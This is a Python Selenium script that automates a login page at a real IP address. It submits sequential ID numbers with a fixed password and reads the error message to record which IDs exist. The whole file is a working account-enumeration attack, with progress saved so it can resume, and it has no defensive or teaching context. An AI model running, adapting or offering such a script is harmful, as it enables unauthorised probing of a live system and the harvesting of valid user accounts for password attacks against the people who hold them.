# -*- coding: utf-8 -*-
from selenium import webdriver
from selenium.webdriver.chrome.options import Options

chrome_options = Options()
chrome_options.add_argument('--headless')
chrome_options.add_argument('--no-sandbox')
chrome_options.add_argument('--disable-gpu')  # 上面三行代码就是为了将Chrome不弹出界面，实现无界面爬取
browser = webdriver.Chrome(options=chrome_options)
browser.get('http://60.219.165.24')
lastid = open('lastid.txt', 'r+')
passid = open('passid.txt', 'a+')
try:
        for i in range(int(lastid.read()[-10:]), 2016026399):
            username = browser.find_element_by_name('zjh')
            username.send_keys(i)
            username = browser.find_element_by_name('mm')
            username.send_keys('23333')
            btn = browser.find_element_by_id('btnSure')
            btn.click()
            message = browser.find_elements_by_xpath(
                '//td[@class="errorTop"]')[0].text
            if message == "你输入的证件号不存在，请您重新输入！":
                print('未通过：' + str(i))
                lastid.write(str(i))
                continue
            else:
                print(i)
                lastid.write(str(i))
                passid.write(str(i) + '\n')
finally:
        browser.close()
        ld = lastid.read()[-10:]
        lastid1 = open('lastid.txt', 'w')
        lastid1.write(ld)
        lastid.close()
        lastid1.close()
        passid.close()